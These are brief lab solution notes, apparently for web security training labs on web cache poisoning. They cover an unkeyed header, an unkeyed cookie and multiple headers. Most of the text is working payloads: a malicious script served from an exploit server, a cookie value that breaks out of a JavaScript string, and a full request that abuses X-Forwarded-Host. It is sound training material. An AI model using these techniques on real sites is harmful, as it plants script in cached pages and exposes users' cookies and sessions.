### Web cache poisoning with an unkeyed header
**Payload**
change the pathfile to `/resources/js/tracking.js` and body in exploit server to:
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Server: Academy Exploit Server
Content-Length: 44

alert(document.cookie);
```
Poison the cache by adding `X-Forwarded-Host: EXPLOIT-SERVER.com`, so when the usual user go to the page, it will load the https://EXPLOIT-SERVER.com/resources/js/tracking.js that contain command js

### Web cache poisoning with an unkeyed cookie
**Payload** : add cookies `fehost=prod-cache-01"-alert(1)-"ss` on the request, it will bypass js strings on
```js
<script>
    data = {
	    "host":"0a4e006204306afc80da805e007f00ec.web-security-academy.net",
	    "path":"/",
	    "frontend":"prod-cache-01"-alert(1)-"ss"
	    }
</script>
```

### Web cache poisoning with multiple headers
**Payload** :
```http
GET /resources/js/tracking.js HTTP/2
Host: 0a2900d704ec75e280f221cc0082002c.web-security-academy.net
Cookie: session=AHEFVheDyN70StuwUFDHjs5dxT89DpMi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a43007a04cb7524802e2010012e0085.exploit-server.net
```
